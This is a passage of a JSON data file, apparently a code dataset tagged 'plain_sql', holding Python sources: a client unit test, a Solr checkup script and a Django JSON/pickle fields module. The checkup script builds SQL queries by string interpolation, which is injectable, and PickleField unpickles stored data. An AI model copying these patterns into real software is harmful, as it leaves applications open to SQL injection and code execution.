1000000)\n\n                insert_list.append(dev)\n\n            client.devices.insert(insert_list)\n\n            # now retrieve them one by one and check serials\n            for dev in insert_list:\n                res = client.devices.get(serial=dev.serial)\n                for retrieved_dev in res:\n                    # replace with assertIsInstance when we drop pre-2.7 support\n                    self.assertTrue(isinstance(retrieved_dev, dev.__class__))\n                    self.assertEqual(retrieved_dev.serial, dev.serial)\n\n            client.devices.delete(res)\n\n    def test_manipulate_empty(self):\n        \"\"\"SET/DEL empty and None objects.\"\"\"\n        with Client() as client:\n            client.devices.insert([])\n            client.devices.insert(None)\n            client.devices.delete([])\n            client.devices.delete(None)\n\n            client.media.insert([])\n            client.media.insert(None)\n            client.media.delete([])\n            client.media.delete(None)\n\n    def test_media_lock_unlock(self):\n        \"\"\"Test media lock and unlock wrappers\"\"\"\n        with Client() as client:\n            # Create a dummy media in db\n            label = '/some/path_%d' % randint(0, 1000000)\n            client.media.add(PHO_DEV_DIR, 'POSIX', None, label, locked=False)\n\n            # Get the created media from db\n            media = client.media.get(id=label)[0]\n\n            # It should not be locked yet\n            self.assertFalse(media.is_locked())\n\n            # Lock it in db\n            client.media.lock([media])\n\n            # Media cannot be locked twice\n            with self.assertRaises(EnvironmentError):\n                client.media.lock([media])\n\n            # Retrieve an up-to-date version\n            media = client.media.get(id=label)[0]\n\n            # This one should be locked\n            self.assertTrue(media.is_locked())\n\n            # Unlock it\n            client.media.unlock([media])\n\n            # Unlocking twice works\n            client.media.unlock([media])\n\n            # The up-to-date version isn't locked anymore\n            media = client.media.get(id=label)[0]\n            self.assertFalse(media.is_locked())\n\n\nif __name__ == '__main__':\n    unittest.main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/miku/siskin/blob/45ec7c0753ecca8522fcdbdb1c5b1412a5a88248",
        "file_path": "/bin/solrcheckup.py",
        "source": "#!/usr/bin/env python\n# coding: utf-8\n#\n# Copyright 2019 by Leipzig University Library, http://ub.uni-leipzig.de\n#                   The Finc Authors, http://finc.info\n#                   Robert Schenk, <robert.schenk@uni-leipzig.de>\n#                   Martin Czygan, <martin.czygan@uni-leipzig.de>\n#\n# This file is part of some open source application.\n#\n# Some open source application is free software: you can redistribute\n# it and/or modify it under the terms of the GNU General Public\n# License as published by the Free Software Foundation, either\n# version 3 of the License, or (at your option) any later version.\n#\n# Some open source application is distributed in the hope that it will\n# be useful, but WITHOUT ANY WARRANTY; without even the implied warranty\n# of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Foobar.  If not, see <http://www.gnu.org/licenses/>.\n#\n# @license GPL-3.0+ <http://spdx.org/licenses/GPL-3.0+>\n\n\"\"\"\n\nAutomated content verification of all sources in the (live) solr\nTicket: #15656\n\nUsage:\n\n    $ solrcheckup.py -d my.db -k 1.2.3.4:8080 -a solr.index.xyz --smtp-sender \"beep@friendlyalarms.com\"\n\nThis script should run fine in cron.\n\"\"\"\n\nimport argparse\nimport io\nimport logging\nimport os\nimport re\nimport smtplib\nimport sqlite3\nimport sys\nimport tempfile\nimport time\nfrom sqlite3 import Error\n\nimport requests\n\nfrom siskin.mail import send_mail\nfrom six.moves.urllib.parse import urlencode\n\nlogging.basicConfig(level=logging.DEBUG)\n\n# The current database schema.\ncreate_schema = \"\"\"\n    CREATE TABLE\n        source\n            (source INT PRIMARY KEY NOT NULL);\n\n    CREATE TABLE\n        institution\n            (institution VARCHAR(30) PRIMARY KEY NOT NULL);\n\n    CREATE TABLE\n        sourcebyinstitution\n            (sourcebyinstitution VARCHAR(30) PRIMARY KEY NOT NULL);\n\n    CREATE TABLE\n        history\n            (date DEFAULT CURRENT_TIMESTAMP,\n            sourcebyinstitution VARCHAR(30) NOT NULL,\n            titles INT NOT NULL);\n\"\"\"\n\n# Via #15656, #note-3\n#\n# datum, source_id, collection, institution, anzahl\n#\n# datum, source_id, institution, anzahl\n# datum, collection, institution, anzahl\n#\n# Some other ideas.\n#\n# (a) Generic time series approach with: time, key, value; where key could be\n# various metrics, like \"sid:0\", \"sid:0,isil:DE-15\", \"isil:DE-15\", ...\n#\n# (b) Something, where we could piggyback on some frontend, e.g. kibana /\n# elasticsearch.\n#\n# (c) Logging only. Log some structured JSON to a file and then write and run\n# analyzer scripts for reports.\n\n\n\n# XXX: Encapsulate this better, to get rid of globals.\nsmtp_server = \"mail.example.com\" # XXX: use generic config for this\nsmtp_port = 465 # XXX: use generic config for this\nsmtp_name = \"\"\nsmtp_password = \"\"\n\nsmtp_sender = \"noreply@example.com\"\nrecipients = [\"a@example.com\", \"b@example.com\"]\n\n\ndef send_message(message):\n    \"\"\"\n    Send e-mail to preconfigured recipients.\n    \"\"\"\n    if not recipients:\n        logging.warn(\"no recipients set, not sending any message\")\n        return\n\n    send_mail(sender=smtp_sender,\n              tolist=recipients,\n              subject=\"SolrCheckup Warnung!\",\n              message=message,\n              smtp=smtp_server,\n              smtp_port=smtp_port,\n              username=smtp_name,\n              password=smtp_password)\n\n\ndef create_connection_and_set_cursor(database):\n    \"\"\"\n    Creates a database connection to a SQLite database and returns a cursor\n    \"\"\"\n    try:\n        conn = sqlite3.connect(database)\n    except Error as e:\n        logging.error(e)\n        sys.exit(\"No database connection could be established.\")\n    cursor = conn.cursor()\n    return (conn, cursor)\n\n\ndef get_solr_result(index, params):\n    \"\"\"\n    Takes a Solr index and a dict of parameters and returns a result object.\n    Index should be hostport or ip:port, like 10.1.1.1:8085.\n    \"\"\"\n    params = urlencode(params)\n    result = requests.get(\"http://%s/solr/biblio/select?%s\" % (index, params))\n    return result.json()\n\n\ndef get_all_current_sources(k10plus, ai):\n    \"\"\"\n    Get all current sources from Solr in both k10plus main index and ai.\n    \"\"\"\n    params = {\n        \"facet\": \"true\",\n        \"facet.field\": \"source_id\",\n        \"facet.mincount\": 3, # because of these cases [\"\", 2, \"\\\" \\\"\", 1]\n        \"q\": \"!source_id:error\",\n        \"rows\": 0,\n        \"wt\": \"json\",\n    }\n\n    result = get_solr_result(k10plus, params)\n    k10plus_sources = result[\"facet_counts\"][\"facet_fields\"][\"source_id\"]\n    k10plus_sources = set([int(sid) for sid in k10plus_sources[::2]])\n\n    result = get_solr_result(ai, params)\n    ai_sources = result[\"facet_counts\"][\"facet_fields\"][\"source_id\"]\n    ai_sources = set([int(sid) for sid in ai_sources[::2]])\n\n    shared = k10plus_sources.intersection(ai_sources)\n    if len(shared) > 0:\n        ssid = [str(sid) for sid in shared]\n        message = \"Die folgenden Quellen befinden sich sowohl im K10plus als auch im AI: {}\".format(\", \".join(ssid))\n        send_message(message)\n\n    return k10plus_sources.union(ai_sources)\n\n\ndef get_all_old_sources(conn, sqlite):\n    \"\"\"\n    Get all old sources from the Database.\n    \"\"\"\n    query = \"\"\"\n        SELECT\n            source\n        FROM\n            source\n        GROUP BY\n            source\n    \"\"\"\n\n    sqlite.execute(query)\n    old_sources = []\n\n    for record in sqlite:\n        old_source = record[0]\n        old_sources.append(old_source)\n\n    return old_sources\n\n\ndef update_sources(conn, sqlite, k10plus, ai):\n    \"\"\"\n    Update the source table.\n    \"\"\"\n    current_sources = get_all_current_sources(k10plus, ai)\n    old_sources = get_all_old_sources(conn, sqlite)\n\n    # Check if the source table is allready filled and this is not the first checkup\n    source_table_is_filled = len(old_sources) > 100\n\n    for old_source in old_sources:\n        if source_table_is_filled and old_source not in current_sources:\n            message = \"Die SID %s ist im aktuellen Import nicht mehr vorhanden.\\nWenn dies beabsichtigt ist, bitte die SID aus der Datenbank loeschen.\" % old_source\n            send_message(message)\n\n    for current_source in current_sources:\n        if current_source not in old_sources:\n            message = \"The source %s is new in Solr.\" % current_source\n            if source_table_is_filled:\n                send_message(message)\n            else:\n                logging.info(message)\n            sql = \"INSERT INTO source (source) VALUES (%s)\" % current_source\n            sqlite.execute(sql)\n            conn.commit()\n\n\ndef get_all_current_institutions(k10plus, ai):\n    \"\"\"\n    Get all current institutions from Solr.\n    \"\"\"\n    current_institutions = set()\n\n    params = {\n        \"facet\": \"true\",\n        \"facet.field\": \"institution\",\n        \"facet.mincount\": 3, # because of these cases [\"\", 2, \"\\\" \\\"\", 1]\n        \"q\": \"!source_id:error\",\n        \"rows\": 0,\n        \"wt\": \"json\",\n    }\n\n    for index in (k10plus, ai):\n        result = get_solr_result(index, params)\n        institutions = result[\"facet_counts\"][\"facet_fields\"][\"institution\"]\n        for institution in institutions[::2]:\n            current_institutions.add(institution)\n\n    return current_institutions\n\n\ndef get_all_old_institutions(conn, sqlite):\n    \"\"\"\n    Get all old institutions from the SQLite database.\n    \"\"\"\n    query = \"\"\"\n        SELECT\n            institution\n        FROM\n            institution\n        GROUP BY\n            institution\n    \"\"\"\n\n    sqlite.execute(query)\n    old_institutions = []\n\n    for record in sqlite:\n        old_institution = record[0]\n        old_institutions.append(old_institution)\n\n    return old_institutions\n\n\ndef get_all_old_sourcebyinstitutions(conn, sqlite):\n    \"\"\"\n    Get all old sourcebyinstitution from the SQLite database.\n    \"\"\"\n    query = \"\"\"\n        SELECT\n            sourcebyinstitution\n        FROM\n            sourcebyinstitution\n        GROUP BY\n            sourcebyinstitution\n    \"\"\"\n\n    sqlite.execute(query)\n    old_sourcebyinstitutions = []\n\n    for record in sqlite:\n        old_sourcebyinstitution = record[0]\n        old_sourcebyinstitutions.append(old_sourcebyinstitution)\n\n    return old_sourcebyinstitutions\n\n\ndef get_old_sourcebyinstitution_number(conn, sqlite, sourcebyinstitution):\n    \"\"\"\n    Get all the old sourcebyinstitution number from the SQLite database.\n    \"\"\"\n    query = \"\"\"\n        SELECT\n            titles\n        FROM\n            history\n        WHERE\n            sourcebyinstitution = \"%s\"\n        ORDER BY\n            titles DESC\n        LIMIT 1\n    \"\"\" % sourcebyinstitution\n\n    sqlite.execute(query)\n    for record in sqlite:\n        old_sourcebyinstitution_number = record[0]\n        return old_sourcebyinstitution_number\n\n\ndef update_institutions(conn, sqlite, k10plus, ai):\n    \"\"\"\n    Update the institution table.\n    \"\"\"\n    current_institutions = get_all_current_institutions(k10plus, ai)\n    old_institutions = get_all_old_institutions(conn, sqlite)\n\n    # Check if the institution table is allready filled and this is not the first checkup\n    institution_table_is_filled = len(old_institutions) > 10\n\n    for old_institution in old_institutions:\n        if institution_table_is_filled and old_institution not in current_institutions:\n            message = \"Die ISIL %s ist im aktuellen Import nicht mehr vorhanden.\\nWenn dies beabsichtigt ist, bitte die Institution aus der Datenbank loeschen.\" % old_institution\n            send_message(message)\n\n    for current_institution in current_institutions:\n        if current_institution == \" \" or '\"' in current_institution:\n                continue\n        if current_institution not in old_institutions:\n            message = \"The institution %s is new in Solr.\" % current_institution\n            if institution_table_is_filled:\n                send_message(message)\n            else:\n                logging.info(message)\n            sql = \"INSERT INTO institution (institution) VALUES ('%s')\" % current_institution\n            sqlite.execute(sql)\n            conn.commit()\n\n\ndef update_history_and_sourcebyinstitution(conn, sqlite, k10plus, ai):\n    \"\"\"\n    Get all current sources and title numbers from Solr and log them into database.\n    \"\"\"\n    current_sources = get_all_current_sources(k10plus, ai)\n    current_institutions = get_all_current_institutions(k10plus, ai)\n    old_sourcebyinstitutions = get_all_old_sourcebyinstitutions(conn, sqlite)\n    current_sourcebyinstitutions = []\n\n    for source in current_sources:\n\n        for institution in current_institutions:\n\n            if not institution or institution == \" \" or '\"' in institution:\n                continue\n\n            sourcebyinstitution = \"SID \" + str(source) + \" (\" + institution + \")\"\n            current_sourcebyinstitutions.append(sourcebyinstitution)\n\n            params = {\n                \"q\": 'source_id:%s AND institution:\"%s\"' % (source, institution),\n                \"rows\": 0,\n                \"wt\": \"json\"\n            }\n\n            # check k10plus\n            result = get_solr_result(k10plus, params)\n            number = result[\"response\"][\"numFound\"]\n            if number != 0:\n                sql = 'INSERT INTO history (sourcebyinstitution, titles) VALUES (\"%s\", %s)' % (sourcebyinstitution, number)\n                sqlite.execute(sql)\n                conn.commit()\n            else:\n                # check ai\n                result = get_solr_result(ai, params)\n                number = result[\"response\"][\"numFound\"]\n                if number != 0:\n                    # TODO: escape via sqlite\n                    sql = 'INSERT INTO history (sourcebyinstitution, titles) VALUES (\"%s\", %s)' % (sourcebyinstitution, number)\n                    sqlite.execute(sql)\n                    conn.commit()\n\n            if sourcebyinstitution not in old_sourcebyinstitutions:\n                logging.info(\"The %s is now connected to SID %s.\", institution, source)\n                sql = \"INSERT INTO sourcebyinstitution (sourcebyinstitution) VALUES ('%s')\" % sourcebyinstitution\n                sqlite.execute(sql)\n                conn.commit()\n\n            if number != 0:\n                old_sourcebyinstitution_number = get_old_sourcebyinstitution_number(conn, sqlite, sourcebyinstitution)\n                if number < old_sourcebyinstitution_number:\n                    message = \"Die Anzahl der Titel hat sich bei %s gegenueber einem frueheren Import verringert.\" % (sourcebyinstitution)\n                    send_message(message)\n\n            # requests.exceptions.ConnectionError: HTTPConnectionPool(XXXXXX): Max retries exceeded\n            time.sleep(0.25)\n\n    for old_sourcebyinstitution in old_sourcebyinstitutions:\n        if old_sourcebyinstitution not in current_sourcebyinstitutions:\n            message = \"Die %s ist nicht laenger fr die SID %s angesigelt.\" % (institution, source)\n            send_message(message)\n\n# Parse keyword arguments\nparser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)\nparser.add_argument(\"-v\",\n                    action=\"version\",\n                    help=\"show version\",\n                    version=\"0.0.1\")\nparser.add_argument(\"-d\",\n                    dest=\"database\",\n                    help=\"path to database\",\n                    default=os.path.join(tempfile.gettempdir(), \"solrcheckup.sqlite\"),\n                    metavar=\"database\")\nparser.add_argument(\"-y\",\n                    dest=\"yaml\",\n                    help=\"link to review.yaml or another yaml template\",\n                    metavar=\"yaml\")\nparser.add_argument(\"-t\",\n                    dest=\"token\",\n                    help=\"private token for GitLab\",\n                    metavar=\"token\")\nparser.add_argument(\"-k\",\n                    dest=\"k10plus\",\n                    help=\"url of the k10plus index\",\n                    metavar=\"k10plus\")\nparser.add_argument(\"-a\",\n                    dest=\"ai\",\n                    help=\"url of the ai index\",\n                    metavar=\"ai\",\n                    required=True)\nparser.add_argument(\"-n\", \"--smtp-name\",\n                    dest=\"smtp_name\",\n                    help=\"the login name fpr the email account\",\n                    metavar=\"smtp-name\")\nparser.add_argument(\"-p\", \"--smtp-password\",\n                    dest=\"smtp_password\",\n                    help=\"the password of the email account\",\n                    metavar=\"smtp_password\")\nparser.add_argument(\"--smtp-server\",\n                    dest=\"smtp_server\",\n                    help=\"SMTP server\",\n                    metavar=\"smtp_server\")\nparser.add_argument(\"--smtp-port\",\n                    dest=\"smtp_port\",\n                    help=\"SMTP port\",\n                    metavar=\"smtp_port\",\n                    default=465)\nparser.add_argument(\"--smtp-sender\",\n                    dest=\"smtp_sender\",\n                    help=\"SMTP from address\",\n                    metavar=\"smtp_sender\",\n                    default=\"noreply@example.com\")\nparser.add_argument(\"--recipients\",\n                    dest=\"recipients\",\n                    help=\"recipients for alert messages, comma separated\",\n                    default=\"\",\n                    metavar=\"recipients\")\n\nargs = parser.parse_args()\n\n# XXX: Reduce use of globals.\nsmtp_server = args.smtp_server\nsmtp_port = args.smtp_port\nsmtp_server = args.smtp_server\nsmtp_sender = args.smtp_sender\nsmtp_name = args.smtp_name\nsmtp_password = args.smtp_password\nrecipients = [addr.strip() for addr in args.recipients.split(\",\") if addr.strip()]\n\ndatabase = args.database\n\n# Exit when using yaml template without private token\nyaml = args.yaml\ntoken = args.token\nif yaml and not token:\n    sys.exit(\"Keyword argument for private token needed when using yaml template.\")\n\n# Ensure that all three indicies are specified\nk10plus = args.k10plus\nai = args.ai\n\n# Check if database already exists, otherwise create new one\nif not os.path.isfile(database):\n    conn, sqlite = create_connection_and_set_cursor(database)\n    sqlite.executescript(create_schema)\nelse:\n    conn, sqlite = create_connection_and_set_cursor(database)\n\n# 1. Step: Update the source table\nupdate_sources(conn, sqlite, k10plus, ai)\n\n# 2. Step: Update the institution table\nupdate_institutions(conn, sqlite, k10plus, ai)\n\n# 3. Step: Get the number of titles for each SID and log them to database\nupdate_history_and_sourcebyinstitution(conn, sqlite, k10plus, ai)\n\nsqlite.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/debnet/common-framework/blob/72edbb297fe9a87b00a6b39b6b29ec34c27a282e",
        "file_path": "/common/__init__.py",
        "source": "# coding: utf-8\n__all__ = []\n__version__ = '2019.7.7'\n\ndefault_app_config = 'common.apps.CommonConfig'\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/debnet/common-framework/blob/72edbb297fe9a87b00a6b39b6b29ec34c27a282e",
        "file_path": "/common/fields.py",
        "source": "# coding: utf-8\nimport base64\nimport decimal\nimport pickle\n\nfrom django.contrib.postgres.lookups import Unaccent\nfrom django.core.exceptions import ValidationError\nfrom django.db import models\nfrom django.db.models import CharField, Lookup, TextField, Transform, lookups\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom common.utils import json_decode, json_encode\n\n\n# Vrifie que l'on utilise le moteur de bases de donnes PostgreSQL\nis_postgresql = lambda connection: connection.vendor == 'postgresql'\nis_mysql = lambda connection: connection.vendor == 'mysql'\nis_sqlite = lambda connection: connection.vendor == 'sqlite'\n\n\nclass CustomDecimalField(models.DecimalField):\n    \"\"\"\n    Champ dcimal spcifique pour viter la reprsentation scientifique\n    \"\"\"\n\n    def value_from_object(self, obj):\n        value = super().value_from_object(obj)\n        if isinstance(value, decimal.Decimal):\n            return self._transform_decimal(value)\n        return value\n\n    def _transform_decimal(self, value):\n        context = decimal.Context(prec=self.max_digits)\n        return value.quantize(decimal.Decimal(1), context=context) \\\n            if value == value.to_integral() else value.normalize(context)\n\n\nclass PickleField(models.BinaryField):\n    \"\"\"\n    Champ binaire utilisant pickle pour srialiser des donnes diverses\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        default = kwargs.get('default', None)\n        if default is not None:\n            kwargs['default'] = pickle.dumps(default)\n        super().__init__(*args, **kwargs)\n\n    def from_db_value(self, value, *args, **kwargs):\n        return self.to_python(value)\n\n    def to_python(self, value):\n        if not value:\n            return None\n        _value = value\n        if isinstance(_value, str):\n            _value = bytes(_value, encoding='utf-8')\n            try:\n                _value = base64.b64decode(_value)\n            except Exception:\n                pass\n        try:\n            return pickle.loads(_value)\n        except Exception:\n            return super().to_python(value)\n\n    def get_prep_value(self, value):\n        if not value:\n            return None if self.null else b''\n        if isinstance(value, bytes):\n            return value\n        return pickle.dumps(value)\n\n    def value_from_object(self, obj):\n        value = super().value_from_object(obj)\n        return self.to_python(value)\n\n    def value_to_string(self, obj):\n        value = self.value_from_object(obj)\n        return base64.b64encode(self.get_prep_value(value))\n\n\nclass JsonDict(dict):\n    \"\"\"\n    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!\n    \"\"\"\n\n    def __repr__(self):\n        return json_encode(self, sort_keys=True)\n\n    @property\n    def base(self):\n        return dict(self)\n\n\nclass JsonString(str):\n    \"\"\"\n    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!\n    \"\"\"\n\n    def __repr__(self):\n        return json_encode(self, sort_keys=True)\n\n    @property\n    def base(self):\n        return str(self)\n\n\nclass JsonList(list):\n    \"\"\"\n    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!\n    \"\"\"\n\n    def __repr__(self):\n        return json_encode(self, sort_keys=True)\n\n    @property\n    def base(self):\n        return list(self)\n\n\nclass JsonField(models.Field):\n    \"\"\"\n    JsonField is a generic TextField that neatly serializes/unserializes JSON objects seamlessly.\n    \"\"\"\n    empty_strings_allowed = False\n    description = _(\"A JSON object\")\n    default_error_messages = {\n        'invalid': _(\"Value must be a valid JSON\")\n    }\n    _default_hint = ('dict', '{}')\n\n    def __init__(self, *args, **kwargs):\n        null = kwargs.get('null', False)\n        default = kwargs.get('default', None)\n        self.encoder = kwargs.get('encoder', None)\n        if not null and default is None:\n            kwargs['default'] = '{}'\n        if isinstance(default, (list, dict)):\n            kwargs['default'] = json_encode(default, cls=self.encoder, sort_keys=True)\n        models.Field.__init__(self, *args, **kwargs)\n\n    def db_type(self, connection):\n        if is_postgresql(connection):\n            return 'jsonb'\n        return super().db_type(connection)\n\n    def get_internal_type(self):\n        return 'TextField'\n\n    def deconstruct(self):\n        name, path, args, kwargs = super().deconstruct()\n        if self.default == '{}':\n            del kwargs['default']\n        if self.encoder is not None:\n            kwargs['encoder'] = self.encoder\n        return name, path, args, kwargs\n\n    def get_transform(self, name):\n        transform = super().get_transform(name)\n        if transform:\n            return transform\n        return JsonKeyTransformFactory(name)\n\n    def from_db_value(self, value, *args, **kwargs):\n        return self.to_python(value)\n\n    def to_python(self, value):\n        \"\"\"\n        Convert our string value to JSON after we load it from the DB\n        \"\"\"\n        if value is None or value == '':\n            return {} if not self.null else None\n        try:\n            while isinstance(value, str):\n                value = json_decode(value)\n        except ValueError:\n            pass\n        if isinstance(value, dict):\n            return JsonDict(**value)\n        elif isinstance(value, str):\n            return JsonString(value)\n        elif isinstance(value, list):\n            return JsonList(value)\n        return value\n\n    def get_db_prep_value(self, value, connection, prepared=False):\n        \"\"\"\n        Convert our JSON object to a string before we save\n        \"\"\"\n        if value is None and self.null:\n            return None\n        # default values come in as strings; only non-strings should be run through `dumps`\n        try:\n            while isinstance(value, str):\n                value = json_decode(value)\n        except ValueError:\n            pass\n        return json_encode(value, cls=self.encoder, sort_keys=True)\n\n    def validate(self, value, model_instance):\n        super().validate(value, model_instance)\n        try:\n            json_encode(value, cls=self.encoder)\n        except TypeError:\n            raise ValidationError(\n                self.error_messages['invalid'],\n                code='invalid',\n                params={'value': value},\n            )\n\n    def value_from_object(self, obj):\n        value = super().value_from_object(obj)\n        return self.to_python(value)\n\n    def value_to_string(self, obj):\n        value = self.value_from_object(obj)\n        return value or ''\n\n    def formfield(self, **kwargs):\n        from common.forms import JsonField\n        defaults = {'form_class': JsonField}\n        defaults.update(kwargs)\n        return super().formfield(**defaults)\n\n\n# Mommy monkey-patch for CustomDecimalField\ntry:\n    from django.contrib.postgres.fields import JSONField\n    from model_mommy.generators import default_mapping\n    default_mapping[CustomDecimalField] = default_mapping.get(models.DecimalField)\n    default_mapping[JsonField] = default_mapping.get(JSONField)\nexcept ImportError:\n    pass\n\n\nclass JsonKeyTransform(Transform):\n    \"\"\"\n    Transformation gnrale pour JsonField\n    \"\"\"\n    operator = '->'\n    nested_operator = '#>'\n\n    def __init__(self, key_name, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.key_name = key_name\n\n    def as_sql(self, compiler, connection, **kwargs):\n        key_transforms = [self.key_name]\n        previous = self.lhs\n        while isinstance(previous, JsonKeyTransform):\n            key_transforms.insert(0, previous.key_name)\n            previous = previous.lhs\n        lhs, params = compiler.compile(previous)\n        if len(key_transforms) > 1:\n            return \"(%s %s %%s)\" % (lhs, self.nested_operator), [key_transforms] + params\n        try:\n            int(self.key_name)\n        except ValueError:\n            lookup = \"'%s'\" % self.key_name\n        else:\n            lookup = \"%s\" % self.key_name\n        return \"(%s %s %s)\" % (lhs, self.operator, lookup), params\n\n\nclass JsonKeyTextTransform(JsonKeyTransform):\n    \"\"\"\n    Transformation pour JsonField afin d'utiliser les lookups sur les lments texte\n    \"\"\"\n    operator = '->>'\n    nested_operator = '#>>'\n    _output_field = TextField()\n\n\nclass JsonKeyTransformTextLookupMixin(object):\n    def __init__(self, key_transform, *args, **kwargs):\n        assert isinstance(key_transform, JsonKeyTransform)\n        key_text_transform = JsonKeyTextTransform(\n            key_transform.key_name, *key_transform.source_expressions, **key_transform.extra)\n        super(JsonKeyTransformTextLookupMixin, self).__init__(key_text_transform, *args, **kwargs)\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformIExact(JsonKeyTransformTextLookupMixin, lookups.IExact):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformContains(JsonKeyTransformTextLookupMixin, lookups.Contains):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformIContains(JsonKeyTransformTextLookupMixin, lookups.IContains):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformStartsWith(JsonKeyTransformTextLookupMixin, lookups.StartsWith):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformIStartsWith(JsonKeyTransformTextLookupMixin, lookups.IStartsWith):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformEndsWith(JsonKeyTransformTextLookupMixin, lookups.EndsWith):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformIEndsWith(JsonKeyTransformTextLookupMixin, lookups.IEndsWith):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformRegex(JsonKeyTransformTextLookupMixin, lookups.Regex):\n    pass\n\n\n@JsonKeyTransform.register_lookup\nclass JsonKeyTransformIRegex(JsonKeyTransformTextLookupMixin, lookups.IRegex):\n    pass\n\n\nclass JsonKeyTransformFactory(object):\n\n    def __init__(self, key_name):\n        self.key_name = key_name\n\n    def __call__(self, *args, **kwargs):\n        return JsonKeyTransform(self.key_name, *args, **kwargs)\n\n\n@JsonField.register_lookup\nclass JsonHas(Lookup):\n    \"\"\"\n    Recherche un lment dans un champ JSON contenant un tableau de chanes de caractres ou un dictionnaire\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'has'\n\n    def as_sql(self, compiler, connection):\n        if is_postgresql(connection):\n            lhs, lhs_params = self.process_lhs(compiler, connection)\n            rhs, rhs_params = self.process_rhs(compiler, connection)\n            assert len(rhs_params) == 1, _(\"A string must be provided as argument\")\n            # assert all(isinstance(e, str) for e in rhs_params), _(\"Argument must be of type string\")\n            params = lhs_params + rhs_params\n            return '%s ? %s' % (lhs, rhs), params\n        raise NotImplementedError(\n            _(\"The lookup '{lookup}' is only supported in PostgreSQL\").format(\n                lookup=self.lookup_name))\n\n\nclass JsonArrayLookup(Lookup):\n    \"\"\"\n    Lookup standard pour la recherche multiple dans des tableaux de chanes de caractres\n    Uniquement pour PostgreSQL\n    \"\"\"\n\n    def as_sql(self, compiler, connection):\n        if is_postgresql(connection):\n            lhs, lhs_params = self.process_lhs(compiler, connection)\n            rhs, rhs_params = self.process_rhs(compiler, connection)\n            assert len(rhs_params) == 1, _(\"A list of strings must be provided as argument\")\n            value, *junk = rhs_params\n            rhs = ','.join(['%s'] * len(value))\n            # assert isinstance(value, list), _(\"Lookup argument must be a list of strings\")\n            return '%s %s array[%s]' % (lhs, self.lookup_operator, rhs), value\n        raise NotImplementedError(\n            _(\"The lookup '{lookup}' is only supported in PostgreSQL\").format(\n                lookup=self.lookup_name))\n\n\n@JsonField.register_lookup\nclass JsonInAny(JsonArrayLookup):\n    \"\"\"\n    Recherche les lments dans au moins une valeur est prsente dans la liste fournie en paramtre\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'any'\n    lookup_operator = '?|'\n\n\n@JsonField.register_lookup\nclass JsonInAll(JsonArrayLookup):\n    \"\"\"\n    Recherche les lments dans toutes les valeurs sont prsentes dans la liste fournie en paramtre\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'all'\n    lookup_operator = '?&'\n\n\n@JsonField.register_lookup\nclass JsonOverlap(JsonArrayLookup):\n    \"\"\"\n    Recherche les lments dans au moins une valeur est prsente dans la liste fournie en paramtre\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'overlap'\n    lookup_operator = '&&'\n\n\nclass JsonDictLookup(Lookup):\n    \"\"\"\n    Lookup standard pour la recherche multiple dans des dictionnaires\n    Uniquement pour PostgreSQL\n    \"\"\"\n\n    def as_sql(self, compiler, connection):\n        if is_postgresql(connection):\n            lhs, lhs_params = self.process_lhs(compiler, connection)\n            rhs, rhs_params = self.process_rhs(compiler, connection)\n            assert len(rhs_params) == 1, _(\"A dictionary must be provided as argument\")\n            value, *junk = rhs_params\n            # assert isinstance(value, dict), _(\"Lookup argument must be a dictionary\")\n            return '%s %s %s::jsonb' % (lhs, self.lookup_operator, rhs), [json_encode(value)]\n        raise NotImplementedError(\n            _(\"The lookup '{lookup}' is only supported in PostgreSQL\").format(\n                lookup=self.lookup_name))\n\n\n@JsonField.register_lookup\nclass JsonContains(JsonDictLookup):\n    \"\"\"\n    Recherche les lments qui contiennent le dictionnaire fourni en paramtre\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'hasdict'\n    lookup_operator = '@>'\n\n\n@JsonField.register_lookup\nclass JsonContained(JsonDictLookup):\n    \"\"\"\n    Recherche les lments qui sont contenus dans le dictionnaire fourni en paramtre\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'indict'\n    lookup_operator = '<@'\n\n\n@JsonField.register_lookup\nclass JsonEmpty(Lookup):\n    \"\"\"\n    Recherche les lments dont la valeur est considre comme vide ou nulle\n    Uniquement pour PostgreSQL\n    \"\"\"\n    lookup_name = 'isempty'\n    empty_values = ['{}', '[]', '', 'null', None]\n\n    def as_sql(self, compiler, connection):\n        if is_postgresql(connection):\n            lhs, lhs_params = self.process_lhs(compiler, connection)\n            rhs, rhs_params = self.process_rhs(compiler, connection)\n            assert len(rhs_params) == 1, _(\"A boolean must be provided as argument\")\n            value, *junk = rhs_params\n            assert isinstance(value, bool), _(\"Lookup argument must be a boolean\")\n            rhs = ','.join(['%s'] * len(self.empty_values))\n            if value:\n                return '%s IS NULL OR %s::text IN (%s)' % (lhs, lhs, rhs), self.empty_values\n            return '%s IS NOT NULL AND %s::text NOT IN (%s)' % (lhs, lhs, rhs), self.empty_values\n        raise NotImplementedError(\n            _(\"The lookup '{lookup}' is only supported in PostgreSQL\").format(\n                